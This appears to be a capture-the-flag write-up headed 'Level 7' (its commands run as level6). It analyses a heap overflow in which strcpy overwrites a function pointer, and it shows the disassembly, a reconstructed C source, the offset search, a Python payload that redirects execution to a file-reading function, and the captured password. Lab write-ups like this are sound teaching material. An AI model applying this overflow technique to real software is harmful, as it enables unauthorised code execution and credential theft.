# Level 7

This time it is completely different. The program `malloc()`s twice then `strcpy()`s somewhere? What?

```gdb
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
   0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:    mov    edx,0x8048468
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:    add    eax,0x4
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:    mov    edx,eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave  
   0x080484d3 <+87>:    ret    
End of assembler dump.
```

With the help of a disassembler we can see more clearely what's happening:

```c
void	n() {
	system("/bin/cat /home/user/level7/.pass");
}

void	m() {
	puts("Nope!");
}

int main(int argc, char **argv) {
	char	*str;
	void	*(*func)();

	str = malloc(0x40);
	func = malloc(0x4);

	func = m;
	strcpy(str, argv[1]);
	(*func)();
}
```

So the program allocates space for a string and a function pointer,
then assigns the function pointer to the function `m()` and copies `argv[1]` in the allocated string.
Also it calls the function pointed by the function pointer.

It looks like, as the `strcpy()` is after the function pointer assignation, that an overflow might happen.
Lets test this:

```bash
level6@RainFall:~$ ./level6 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Segmentation fault (core dumped)
level6@RainFall:~$ dmesg
[...]
[90729.267071] level6[18127]: segfault at 53535353 ip 53535353 sp bffff5ac error 14
```

We see that we are segfault-ing at 53535353, which is our 'SSSS'. So the offset is 72.
The address of `n()` is `0x804845a`, so to call `n()` instead of `m()` we should only give the address after our 72 characters of offset.

```python
print(72 * '*' + '\x5a\x84\x04\x08')
```

```bash
level6@RainFall:~$ ./level6 $(python level6.py)
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

Works smoothly!

## .pass: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d